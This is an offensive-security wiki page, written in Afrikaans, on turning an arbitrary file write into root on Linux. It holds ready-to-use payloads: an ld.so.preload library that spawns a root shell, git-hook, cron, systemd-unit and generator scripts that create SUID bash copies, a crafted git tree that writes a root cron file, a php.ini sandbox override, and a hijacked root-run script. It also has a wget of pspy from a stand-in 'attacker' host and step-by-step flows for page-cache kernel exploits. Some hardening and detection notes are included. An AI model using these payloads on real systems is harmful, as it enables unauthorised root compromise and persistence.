# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` is ’n stelselwye lys van shared objects wat die dynamic linker voor ander shared objects laai. Secure-execution mode pas bykomende beperkings op preloading toe, dus is ’n library path soos `/tmp/pe.so` nie ’n universele SUID-binary technique nie.\
As jy dit kan skep of wysig, sal ’n proses wat die lêer laai die gelyste library voor sy ander shared objects laai, wat code execution in daardie proses se konteks moontlik maak.<sup>[[12]](#references)</sup>

Byvoorbeeld: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** is uitvoerbare scripts wat vir gebeurtenisse in ’n repository uitgevoer word, insluitend commit- en merge-bewerkings. Indien ’n **bevoorregte script of gebruiker** hierdie handelinge uitvoer en ’n aanvaller in die **`.git`-lêergids** kan skryf, kan die hook vir **privilege escalation** gebruik word.<sup>[[13]](#references)</sup>

Dit is byvoorbeeld moontlik om ’n **script te genereer** in ’n git repo in **`.git/hooks`**, sodat dit altyd uitgevoer word wanneer ’n nuwe commit geskep word:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Padtraversering in bevoorregte Git-boomuitvoer

'n Bevoorregte synchronizer kan 'n checkout vermy en eerder 'n aanvaller-beïnvloede repository met `git ls-tree` opnoem, elke blob met `git cat-file` lees, die gerapporteerde padnaam by 'n staging-gids voeg, en dit self skryf. Dit word 'n **arbitrary file write met die synchronizer se privileges** wanneer dit `-c safe.directory=*` (wat Git se beskerming teen repositories met 'n ander eienaar deaktiveer) kombineer met geen destination containment check nie. 'n Absolute tree-entry name veroorsaak dat Python se `os.path.join(stage, name)` `stage` weggooi; 'n relatiewe naam wat `../` bevat, ontsnap wanneer die filesystem dit resolve. Omdat die application die raw tree materialiseer eerder as om Git te vra om dit uit te check, beskerm checkout-time pathname rejection nooit die sink nie.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Soek na hierdie kodevorm in root services, timers, deployment agents, template importers en backup/restore jobs:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
'n Tree-inskrywing word geënkodeer as `<mode> SP <name> NUL <raw object ID>`. Die `git hash-object --literally`-opsie laat doelbewus objekdata toe wat normale ontleding of `git fsck` moontlik sal verwerp, sodat 'n weggooibare kloon 'n tree kan konstrueer waarvan die lêernaam 'n absolute bestemming is. Hierdie voorbeeld skep 'n cron-file blob, verpak die vervaardigde tree in 'n commit en verskuif 'n tak daarna; exploitation vereis steeds toestemming om 'n repository by te werk wat deur die bevoorregte taak gebruik word, asook 'n Git-bediener wat die misvormde objek aanvaar.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Verharding moet beide repository-inname en die finale lêerstelselbewerking dek:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Vervang `safe.directory=*` met die presiese repositories wat die diens moet vertrou, en voer repository-verwerking waar moontlik sonder root-voorregte uit.
- Verwerp absolute name en enige `.`- of `..`-komponent voordat materialisering plaasvind. Na samevoeging, kanoniseer en verifieer dat die bestemming binne die beoogde wortel bly.
- Vermy simlink-rasse tussen kontrole en oopmaak: maak oop relatief tot ’n vertroude gidsbeskrywer en gebruik op Linux `openat2()` met `RESOLVE_BENEATH` plus `RESOLVE_NO_SYMLINKS` vir paaie wat deur ’n aanvaller beheer word.
- Verkies ’n normale checkout in ’n geïsoleerde gids bo die herimplementering van checkout vanuit plumbing-uitset. Indien raw-object-inname vereis word, aktiveer ontvangskant-validering soos `receive.fsckObjects=true`; moenie die padnaamverwante `receive.fsck.*`-bevindinge wat nodig is om vervaardigde trees te verwerp, afgradeer nie.

### Cron & Tyd-lêers

As jy **Cron-verwante lêers kan skryf wat root uitvoer**, kan jy gewoonlik code execution kry die volgende keer wat die job loop. Interessante teikens sluit in:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root se eie crontab in `/var/spool/cron/` of `/var/spool/cron/crontabs/`
- `systemd`-timers en die services wat hulle aktiveer

Vinnige kontroles:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipiese misbruikpaaie:

- **Voeg ’n nuwe root-cronjob by** in `/etc/crontab` of ’n lêer in `/etc/cron.d/`
- **Vervang ’n script** wat reeds deur `run-parts` uitgevoer word
- **Plaas ’n backdoor in ’n bestaande timer-teiken** deur die script of binary wat dit lanseer, te wysig

Minimale cron-payload-voorbeeld:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
As jy slegs binne ’n cron-gids wat deur `run-parts` gebruik word kan skryf, plaas eerder ’n uitvoerbare lêer daar:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notas:

- `run-parts` ignoreer gewoonlik lêername wat punte bevat, dus verkies name soos `backup` eerder as `backup.sh`.<sup>[[15]](#references)</sup>
- Sommige stelsels gebruik `systemd` timers in plaas van klassieke cron, maar die misbruikidee is dieselfde: **wysig wat root later sal uitvoer**.<sup>[[20]](#references)</sup>

### Service- en Socket-lêers

As jy **`systemd` unit-lêers** of lêers waarna hulle verwys kan skryf, kan jy moontlik code execution as root verkry deur die unit te herlaai en te herbegin, of deur te wag totdat die service/socket activation-pad geaktiveer word.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Interessante teikens sluit in:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries waarna `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` verwys
- Skryfbare `EnvironmentFile=`-paths wat deur ’n root service gelaai word

Vinnige kontroles:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Algemene misbruikpaaie:

- **Oorskryf `ExecStart=`** in ’n root-owned service unit wat jy kan wysig
- **Voeg ’n drop-in override by** met ’n malicious `ExecStart=` en maak eers die ou een leeg
- **Plaas ’n backdoor in die script/binary** waarna die unit reeds verwys
- **Kaap ’n socket-activated service** deur die ooreenstemmende `.service`-lêer te wysig wat begin wanneer die socket ’n verbinding ontvang

Voorbeeld van ’n malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipiese aktiveringsvloei:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
As jy nie self dienste kan herbegin nie, maar ’n socket-activated unit kan wysig, hoef jy moontlik net **vir ’n kliëntverbinding te wag** om die backdoored diens as root te laat uitvoer.<sup>[[17]](#references)</sup>

### systemd generator-gidse

**System generators** is uitvoerbare lêers wat deur die system manager geloods word voordat dit unit-lêers laai, beide tydens boot en wanneer konfigurasie herlaai word. Daarom is skryftoegang tot ’n system-generator-gids (of tot ’n bestaande uitvoerbare generator) ’n direkte root-code-execution-primitief wat maklik gemis word wanneer ’n audit slegs `*.service`- en `*.timer`-lêers nagaan.<sup>[[35]](#references)[[36]](#references)</sup>

Die gewone soekvolgorde is `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` en `/usr/lib/systemd/system-generators/` (sommige distributions stel `/lib/systemd/system-generators/` deur die `/usr`-merge beskikbaar). ’n Uitvoerbare lêer met dieselfde naam in ’n vroeëre gids verberg die latere een. Moenie hierdie **input executable directories** verwar met `/run/systemd/generator`, `/run/systemd/generator.early` en `/run/systemd/generator.late` nie; dié bevat tydelike unit-uitset wat deur generators geproduseer word.<sup>[[35]](#references)</sup>

Vinnige kontroles:
```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
/lib/systemd/system-generators; do
[ -e "$d" ] || continue
namei -l "$d"
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
getfacl -p "$d" "$d"/* 2>/dev/null
done
```
'n Nuutgeskepte generator moet sy executable bit gestel hê. As die write primitive bytes beheer maar nie mode nie, teiken 'n generator wat reeds executable is; deur dit in plek te truncateer, bly sy metadata normaalweg behoue. As die gids self writable is, skep 'n nuwe inskrywing en merk dit as executable.<sup>[[35]](#references)</sup>
```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```
Om `systemctl daemon-reload` teen die **system** manager te aktiveer, word toepaslike magtiging vereis, maar dit voer elke system generator weer uit; andersins moet jy wag vir ’n bevoorregte reload, package-bewerking of reboot. User-generator-gidse soos `~/.config/systemd/user-generators/` word onder die user manager uitgevoer en verskaf nie vanself root nie.<sup>[[35]](#references)</sup>

Vir hardening en hunting, verifieer elke padkomponent en ACL eerder as net die finale mode-bits, stel baseline-hashes/package-eienaarskap van generators vas, en skep alerts vir create-, rename-, inhouds- of permission-veranderinge in alle system-generator-invoergidse. Monitering van die write is belangrik omdat ’n one-shot generator homself ná uitvoering kan delete, terwyl die gegenereerde unit tree onder `/run/systemd/generator*` met die volgende reload herbou word.<sup>[[35]](#references)[[36]](#references)</sup>

### Oorskryf ’n restrictive `php.ini` wat deur ’n bevoorregte PHP-sandbox gebruik word

Sommige custom daemons valideer gebruiker-verskafde PHP deur `php` met ’n **restricted `php.ini`** uit te voer (byvoorbeeld, `disable_functions=exec,system,...`). As die sandboxed code steeds **enige write primitive** (soos `file_put_contents`) het en jy toegang tot die **presiese `php.ini`-pad** wat deur die daemon gebruik word kan kry, kan jy daardie **config oorskryf** om restrictions op te hef en daarna ’n second payload indien wat met verhoogde voorregte uitgevoer word.<sup>[[2]](#references)</sup>

Tipiese vloei:

1. First payload oorskryf die sandbox-config.
2. Second payload voer code uit noudat dangerous functions weer enabled is.

Minimumvoorbeeld (vervang die pad wat deur die daemon gebruik word):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Indien die daemon as root loop (of met root-owned paths valideer), lewer die tweede uitvoering ’n root-konteks. Dit is in wese **privilege escalation via config overwrite** wanneer die sandboxed runtime steeds lêers kan skryf.

### binfmt_misc

`binfmt_misc` stel registrasies onder `/proc/sys/fs/binfmt_misc` bloot; elke registrasie koppel ’n lêertipepatroon aan ’n interpreter. Die privilege-impak hang af van wie die registrasie kan verander en watter proses later die ooreenstemmende lêer uitvoer, dus moet jy hierdie vereistes verifieer voordat jy dit as ’n privilege-escalation-pad beskou.<sup>[[21]](#references)</sup>

### Oorskryf schema handlers (soos http: of https:)

Desktop-omgewings gebruik MIME-assosiasies en desktop entries om ’n toepassing vir URI-skemas te kies; ’n aanvaller wat die toepaslike per-user configuration- en desktop-entry-gidse kan skryf, kan daardie skemas herlei na ’n launcher onder hul beheer. Deur die `$HOME/.config/mimeapps.list`-lêer te wysig om HTTP- en HTTPS-URL-handlers na ’n kwaadwillige lêer te wys (byvoorbeeld, `x-scheme-handler/http=evil.desktop` en `x-scheme-handler/https=evil.desktop`), kan ’n gebruikerskliek daardie desktop entry aanroep.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root wat user-writable scripts/binaries uitvoer

As ’n bevoorregte workflow iets soos `/bin/sh /home/username/.../script` uitvoer (of enige binary binne ’n directory wat deur ’n unprivileged user besit word), kan jy dit kaap:<sup>[[1]](#references)</sup>

- **Bespeur die uitvoering:** monitor prosesse met pspy om root op te spoor wanneer dit user-controlled paths aanroep.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Bevestig skryfbaarheid:** verseker dat beide die teikenlêer en sy gids deur jou gebruiker besit word en deur jou gebruiker geskryf kan word.
- **Kaap die teiken:** backup die oorspronklike binary/script en plaas ’n payload wat ’n SUID shell (of enige ander root action) skep, en herstel dan die permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger die bevoorregte aksie** (bv. deur 'n UI-knoppie te druk wat die helper laat spawn). Wanneer root die gekaapte pad weer uitvoer, verkry die verhoogde shell met `./rootshell -p`.

### Slegs-page-cache-lêerwysiging van bevoorregte binaries

Sommige kernel-bugs wysig nie die lêer **op skyf** nie. In plaas daarvan laat hulle jou toe om slegs die **page cache-kopie** van 'n leesbare lêer te wysig. As jy 'n **setuid**- of andersins **root-uitgevoerde** binary kan teiken, kan die volgende uitvoering aanvaller-beheerde bytes uit geheue uitvoer en privileges verhoog, selfs al is die lêer se hash op skyf onveranderd.<sup>[[3]](#references)[[4]](#references)</sup>

Dit is nuttig om hieraan te dink as 'n **runtime-only lêerskryf-primitief**:<sup>[[3]](#references)</sup>

- **Skyf bly skoon**: die inode en bytes op skyf verander nie
- **Geheue is vuil**: prosesse wat die gecachede page lees/uitvoer, kry die aanvaller-gemodifiseerde inhoud
- **Effek is tydelik**: die verandering verdwyn ná 'n herlaai of cache-eviction

Hierdie primitief sit tussen klassieke **arbitrary file write** en ouer **page-cache abuse**-bugs soos Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW het op 'n race gesteun
- Dirty Pipe het beperkings op die skryfposisie gehad
- 'n Slegs-page-cache-primitief kan meer betroubaar wees as die kwesbare pad direkte writes na gecachede file-backed pages bied

#### Generiese privesc-vloei

1. Kry 'n kernel-primitief wat na **file-backed page cache pages** kan skryf
2. Gebruik dit teen 'n **leesbare bevoorregte binary** of 'n ander root-uitgevoerde lêer
3. Trigger uitvoering **voordat** die page uit die cache verwyder word
4. Kry code execution as root terwyl die lêer op skyf steeds onveranderd lyk

Tipiese hoëwaarde-teikens:

- **setuid-root** binaries
- Helpers wat deur **root services** geloods word
- Binaries wat algemeen uitgevoer word vanuit **containers wat die host kernel/page cache deel**

#### AF_ALG + `splice()`-voorbeeldpad

Copy Fail (CVE-2026-31431) is 'n goeie voorbeeld van hierdie klas. Die kwesbare pad was in die Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` kan verwysings na page-cache pages van 'n leesbare lêer na die crypto TX scatterlist verskuif
- die in-place `algif_aead` decrypt-pad het source- en destination-buffers hergebruik
- `authencesn` het vervolgens na die destination-taggebied geskryf
- wanneer daardie gebied steeds na spliced file-backed pages verwys het, het die write in die **page cache van die teikenlêer** beland

Die interessante tegniek is dus nie die CVE self nie, maar die patroon:

- **voer file-backed cache pages in 'n kernel-substelsel in**
- laat die substelsel hulle as **skryfbare output** hanteer
- trigger 'n klein, beheerde overwrite in geheue

Die publieke PoC het herhaalde **4-byte writes** gebruik om `/usr/bin/su` in geheue te patch en dit daarna uitgevoer.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE-clone-voorbeeldpad

DirtyClone (CVE-2026-43503) toon 'n ander variant van dieselfde **page-cache-only write-to-root**-patroon, maar hierdie keer is die sink **IPsec ESP decrypt** in plaas van `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Die belangrike tegniek is die **metadata-laundering-stap**:

- `splice()` plaas 'n **read-only file-backed page-cache page** in 'n ESP-in-UDP-pakkie
- die oorspronklike DirtyFrag-mitigering het daardie skb met `SKBFL_SHARED_FRAG` gemerk sodat `esp_input()` **voor decrypting sou kopieer**
- netfilter `TEE` dupliseer die pakkie deur `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- die clone behou dieselfde **fisiese page-cache-verwysing**, maar verloor `SKBFL_SHARED_FRAG`
- `esp_input()` hanteer die clone dan as veilig en voer **in-place `cbc(aes)` decrypt** oor die file-backed page uit

Die les vir reviewers is dus breër as die CVE: indien 'n mitigering op **skb/page-metadata** staatmaak om te bepaal of 'n operasie eers moet kopieer, kan enige **clone/copy-pad wat die backing page behou maar die metadata verwyder** die write-primitief stilweg heropen.

Tipiese exploitation-vloei:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` om **`CAP_NET_ADMIN` binne 'n private network namespace** te verkry
2. bring loopback op en installeer 'n **netfilter `TEE`-reël** in `mangle/OUTPUT`
3. installeer **XFRM ESP transport SAs** via `NETLINK_XFRM`
4. enkodeer elke geteikende 4-byte word in die SA se `seq_hi`-veld (DirtyFrag se word-selection-truuk)
5. stuur die spliced ESP-in-UDP-pakkie sodat die **TEE-clone** `esp_input()` bereik en **in place** decrypt
6. herhaal totdat die page-cache-kopie van `/usr/bin/su` of 'n ander bevoorregte executable aanvaller-beheerde code bevat

Operasioneel is die impak dieselfde as in die `AF_ALG`-voorbeeld: die lêer op skyf bly skoon, maar `execve()` gebruik die **gemuteerde page-cache-bytes** en lewer root.<sup>[[8]](#references)[[9]](#references)</sup>

Nuttige blootstellingskontroles vir hierdie variant:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Korttermyn-vermindering van die aanvalsoppervlak is ook hier padspesifiek: opgradering na ’n kernel wat `48f6a5356a33` bevat, herstel die clone path, terwyl die blokkering van `xt_TEE`-autoload die **flag-laundering step** verwyder en die blokkering van `esp4` / `esp6` die **decrypt sink** verwyder.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Blootstelling en hunting

As jy hierdie klas bug vermoed, moenie net op skyfintegriteitskontroles staatmaak nie. Verifieer ook:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Die konfigurasiewaardes hieronder onderskei ’n loadable interface van een wat in die kernel ingebou is; die crypto build rules karteer `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kan as ’n module gelaai/ontlaai word
- `CONFIG_CRYPTO_USER_API_AEAD=y`: die interface is in die kernel ingebou
- setuid binaries is goeie teikens omdat ’n page-cache-only patch genoeg kan wees om ’n plaaslike foothold na root om te skakel

#### Vermindering van die attack surface vir die `algif_aead`-pad

As die kwesbare interface deur ’n loadable module voorsien word:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Indien dit in die kernel saamgestel is, het sommige disclosures gerapporteer dat die init path geblokkeer word met:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Hierdie soort versagting is ook die moeite werd om vir ander kernel LPEs te onthou: indien exploitation van ’n spesifieke optional interface afhang, kan die deaktivering of blacklisting van daardie interface die exploit path breek selfs voordat ’n volledige kernel-opgradering beskikbaar is.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – kaping van ’n script wat as root uitgevoer word in ’n PaperCut-gids waarin ’n gebruiker kan skryf](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security-openbaarmaking vir CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable-fix: crypto: algif_aead - Keer terug na bedryf buite plek](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431-advies](https://copy.fail/)
- [7] [Theori / Xint tegniese uiteensetting](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone-bewaarplek / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Ontleding en exploitation van Linux LPE-variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux-fix: net: skb: behou `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Vroeëre Linux-versagting: stel `SKBFL_SHARED_FRAG` vir gesplyte UDP-pakkette (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian-handleidingbladsy](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Die Linux-kerneldokumentasie](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME-toepassingassosiasies](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Gedeelde MIME-inligting-spesifikasie](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry-spesifikasie](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig-taal](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux-kernel AF_ALG-bladsykas-kwesbaarheid](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object`-dokumentasie](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree`-dokumentasie](https://git-scm.com/docs/git-ls-tree)
- [33] [Git-konfigurasiedokumentasie](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd-generator-dokumentasie](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: volhardingsmeganismes](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
